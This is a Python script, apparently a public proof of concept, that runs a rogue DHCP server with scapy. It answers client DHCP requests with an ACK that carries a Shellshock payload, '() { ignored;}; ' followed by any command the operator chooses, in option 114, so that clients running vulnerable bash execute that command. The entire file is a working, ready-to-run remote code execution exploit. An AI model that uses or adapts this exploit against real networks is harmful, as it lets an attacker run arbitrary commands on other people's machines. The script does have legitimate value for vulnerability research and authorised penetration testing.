#! /usr/bin/env python

#Based on the PoC from https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/
#Created by @byt3bl33d3r

import binascii
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy

from scapy.all import *

parser = argparse.ArgumentParser(description='DHCPShock', epilog='Shock dem shells!')
parser.add_argument('-i', '--iface', type=str, required=True, help='Interface to use')
parser.add_argument('-c', '--cmd', type=str, help='Command to execute [default: "echo pwned"]')

args = parser.parse_args()

command = args.cmd or "echo 'pwned'"

if os.geteuid() != 0:
    sys.exit("Run me as r00t")

#BOOTP
#siaddr = DHCP server ip
#yiaddr = ip offered to client
#xid = transaction id 
#chaddr = clients mac address in binary format

def dhcp_offer(raw_mac, xid):
	packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
	IP(src="192.168.2.1", dst='255.255.255.255') /
	UDP(sport=67, dport=68) /
	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
	DHCP(options=[("message-type", "offer"),
		('server_id', '192.168.2.1'),
		('subnet_mask', '255.255.255.0'),
		('router', '192.168.2.5'),
		('lease_time', 172800),
		('renewal_time', 86400),
		('rebinding_time', 138240),
		"end"]))

	return packet


def dhcp_ack(raw_mac, xid, command):
	packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
	IP(src="192.168.2.1", dst='255.255.255.255') /
	UDP(sport=67, dport=68) /
	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
	DHCP(options=[("message-type", "ack"),
		('server_id', '192.168.2.1'),
		('subnet_mask', '255.255.255.0'),
		('router', '192.168.2.5'),
		('lease_time', 172800),
		('renewal_time', 86400),
		('rebinding_time', 138240),
		(114, "() { ignored;}; " + command),
		"end"]))

	return packet


def dhcp(resp):
	if resp.haslayer(DHCP):
		mac_addr = resp[Ether].src
		raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

		if resp[DHCP].options[0][1] == 1:
			xid = resp[BOOTP].xid
			print "[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid)
			print "[*] Sending OFFER..."
			packet = dhcp_offer(raw_mac, xid)
			#print hexdump(packet)
			#print packet.show()
			sendp(packet, iface=args.iface)

		if resp[DHCP].options[0][1] == 3:
			xid = resp[BOOTP].xid
			print "[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid)
			print "[*] Sending ACK..."
			packet = dhcp_ack(raw_mac, xid, command)
			#print hexdump(packet)
			#print packet.show()
			sendp(packet, iface=args.iface)

print "[*] Waiting for a DISCOVER..."
sniff(filter="udp and (port 67 or 68)", prn=dhcp, iface=args.iface)
